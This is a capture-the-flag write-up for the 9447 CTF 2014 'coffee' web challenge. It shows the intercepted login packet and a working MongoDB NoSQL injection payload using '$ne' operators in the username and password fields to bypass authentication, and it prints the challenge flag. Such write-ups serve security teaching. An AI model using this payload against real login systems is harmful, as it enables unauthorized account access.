## 9447 Security Society CTF 2014 - coffee (Web 120)
##### 29-30/11/2014 (36hr)
___

### Description: 
You're a hipster, and as such are too good for a job. You do however, need 
your grande decaf hazelnut soy latte - stat! Acquire some coffee without resorting 
to selling one of your vintage vinyls.

The URL for the coffee ordering site is: http://coffeeio.9447.plumbing/
___
### Solution

We have an coffee ordering site. When we get an order a user/pass form appeared. The 
goal is to login (as any user). The site uses AJAX JSON for making the requests. When
try to login the following packet is sent (we use burpsuite to tamper the packet, HTTP
live headers won't work because we have asyncronous requests):
```
42["payment", {
	"username":"foo",
	"password":"bar",
	"order": { 
		"type":true,
		"size":"bucket",
		"milk":"almond",
		"decaf":true,
		"orange":false,
		"caramel":false,
		"hazelnut":false,
		"pumpkinSpice":false
		}
	}
]
```

That's clearly an JSON SQLi. We try this:
```	
    "username":{"!=":"foo"},
	"password":{"!=":"foo"},
```
This means that the username is checked whether it is NOT equal with foo. Unfortunately
this doesn't work. Then we try the nosqli type: $ne, and we get the flag:
	**9447{c0ffee_pr1ces_in_AUS_suck_3_50_is_standard}**

The packet used for the injection is shown below:
```
42["payment", {
	"username":{"$ne":"foo"},
	"password":{"$ne":"foo"},
	"order": { 
		"type":true,
		"size":"bucket",
		"milk":"almond",
		"decaf":true,
		"orange":false,
		"caramel":false,
		"hazelnut":false,
		"pumpkinSpice":false
		}
	}
]
```
Useful info from: http://tasteless.se/2014/12/9447-security-society-ctf-2014-bashful-and-coffee-writeup/

To know it was about NoSQL you should have spotted the /nodes_modules/ directory where 
you could have seen mongodb directory.

___
